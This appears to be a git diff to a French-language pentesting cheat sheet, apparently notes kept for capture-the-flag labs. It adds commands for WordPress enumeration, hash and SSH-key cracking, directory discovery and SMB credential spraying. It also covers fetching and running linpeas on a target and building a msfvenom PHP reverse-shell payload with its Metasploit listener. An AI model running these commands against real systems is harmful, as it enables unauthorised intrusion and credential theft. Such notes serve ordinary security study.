@@ -17,7 +17,10 @@ Brute force srv mail
 wordpress
 ```
 find / -name *wordpress*.nse
-nmap -p 80 ip --script=http-wordpress-users
+
+nmap -p 80 ip --script=http-wordpress-users # trouver les users
+
+nmap -p 80 ip --script=http-wordpress-enum # trouver les plugins installés
 ```
 
 ## john
@@ -48,6 +51,9 @@ hascat -h | grep MD5
 hashcat -m 0 file dict1 dict2 dict3
 ```
 
+## hydra
+brute force web
+
 ## Metasploit
 
 ```
@@ -74,20 +80,29 @@ lors d'un hashdump, on se concentre sur la dernière partie (le hash NTLM) car l
 
 ``meterpreter> search -f flag*``
 
-# gobuster
-
+## gobuster
+Dir discovery
 `gobuster dir -w path/to/wordlist -u url`
 
-# burp
+## dirb
+Dir discovery
+`dirb url`
 
+## Kiterunner
+Dir discovery
+
+https://github.com/assetnote/kiterunner
+
+## burp
+intercepter et modifier des requêtes http
 `burpsuite`
 
-# netcat
+## netcat
 
-Ecouter un reverse shell  
+Ecouter un reverse shell  # peut etre aussi fait avec msfconsole
 `nc -nlvp 1234` 
 
-# linpeas
+## linpeas
 
 ``wget -O url/linpeas.sh``  
 Pour l'envoyer sur la machine cible  
@@ -100,6 +115,11 @@ wget -O linpeas.sh http://ip_machine:8081/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
+
+## wpscan
+une fois qu'on a des users wordpress  
+`wpscan --url url -U wp_user_file -P dic_file -v`
+
 
 # emlAnalyzer
 
@@ -117,3 +137,36 @@ john --wordlist=/isr/share/wordlists/rockyou.txt hashzip
 ```
 
 `unzip secret.zip`
+
+# ssh2john
+Quand une secret key a une passphrase
+
+```
+ssh2john id_rsa > hash_ssh
+john hash_ssh --wordlist=/usr/share/wordlists/john.lst
+```
+
+## nikto
+sur un serveur web
+`nikto -h ip:port`
+
+
+# msfvenom
+création d'un payload pour reverse shell
+`msfvenom -p php/meterpreter/reverse_tcp lhost=ip_host lport=443 -o reverse.php`
+
+puis avec msfconsole
+```
+msfconsole
+use exploit/multi/handler
+msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set lport 443
+lport => 443
+msf exploit(multi/handler) > set lhost 192.168.1.128
+lhost => 192.168.1.128
+run
+```
+
+## netexec
+`nxc smb 10.10.0.0/24 -u creds.txt -p passwords.txt --local-auth`
